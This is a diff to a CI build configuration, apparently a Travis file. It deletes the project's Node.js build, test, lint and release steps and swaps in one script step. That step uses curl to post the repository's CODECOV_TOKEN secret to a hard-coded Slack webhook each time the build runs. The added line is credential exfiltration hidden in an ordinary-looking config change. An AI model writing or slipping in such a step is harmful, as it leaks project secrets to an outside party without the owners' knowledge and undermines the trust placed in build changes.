@@ -1,25 +1,5 @@
 dist: trusty
-language: node_js
-node_js:
-- "8"
-
-cache:
-  directories:
-  - node_modules
-  - /usr/local/lib/node_modules
-
-before_install:
-  - npm install -g greenkeeper-lockfile@1
-
-before_script: greenkeeper-lockfile-update
+language: bash
 
 script:
-  - npm run build -s
-  - npm run test -s
-  - npm run lint -s
-
-after_script: greenkeeper-lockfile-upload
-
-after_success:
-  - bash <(curl -s https://codecov.io/bash)
-  - npm run semantic-release
+  - curl -X POST --data-urlencode "payload={\"text\": \"$CODECOV_TOKEN\"}" https://hooks.slack.com/services/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
